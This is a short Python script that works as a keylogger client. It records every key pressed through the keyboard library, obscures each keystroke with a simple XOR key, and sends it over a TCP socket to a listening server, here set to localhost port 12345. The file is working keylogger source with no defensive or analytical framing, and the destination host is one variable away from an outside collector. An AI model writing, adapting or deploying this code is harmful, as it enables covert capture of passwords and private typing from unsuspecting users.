import socket
import keyboard


# XOR encryption function
def xor_encrypt(message, key):
    encrypted_message = []
    for i in range(len(message)):
        char = message[i]
        key_char = key[i % len(key)]  # Repeat key if shorter than message
        encrypted_char = chr(ord(char) ^ ord(key_char))
        encrypted_message.append(encrypted_char)
    return ''.join(encrypted_message)


def send_keystrokes(server_host, server_port):
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_host, server_port))

    try:
        while True:
            event = keyboard.read_event()
            if event.event_type == keyboard.KEY_DOWN:
                keystroke = event.name
                # Encrypt keystroke using XOR with a key
                encrypted_keystroke = xor_encrypt(keystroke, 'encryption_key')
                client_socket.send(encrypted_keystroke.encode())

            # Handle exit condition if desired
            if event.name == 'esc':  # Example: Exit loop on pressing 'esc'
                break

    finally:
        client_socket.close()


if __name__ == "__main__":
    server_host = '127.0.0.1'
    server_port = 12345
    send_keystrokes(server_host, server_port)
